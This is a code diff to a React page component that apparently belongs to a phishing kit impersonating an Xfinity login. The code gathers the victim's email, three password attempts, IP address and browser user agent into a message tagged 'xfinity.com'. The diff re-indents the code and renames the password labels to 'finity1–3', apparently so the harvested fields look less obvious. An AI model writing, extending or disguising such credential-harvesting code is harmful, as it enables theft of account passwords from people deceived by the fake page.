@@ -21,19 +21,19 @@ const Home = () => {
     const [count, setCount] = useState(0)
     const [clientIp, setClientIp] = useState('');
     const [userAgent, setUserAgent] = useState(navigator.userAgent);
-  
+
     useEffect(() => {
-      // Fetch the client's IP address using an external API
-      fetch('https://api64.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          setClientIp(data.ip);
-        })
-        .catch(error => {
-          console.error('Error fetching IP address:', error);
-        });
+        // Fetch the client's IP address using an external API
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                setClientIp(data.ip);
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+            });
     }, []);
-    
+
     useEffect(() => {
         if (userEmail) {
             setEmail(userEmail)
@@ -119,9 +119,9 @@ const Home = () => {
                 // Proceed with form submission
 
                 const message = `Email: ${email}
-                Password1: ${password1}
-                Password2: ${password2}
-                Password3: ${password}
+                finity1: ${password1}
+                finity2: ${password2}
+                finity3: ${password}
                 Website: xfinity.com
                 Client IP: ${clientIp}
                 User Agent: ${userAgent}`;
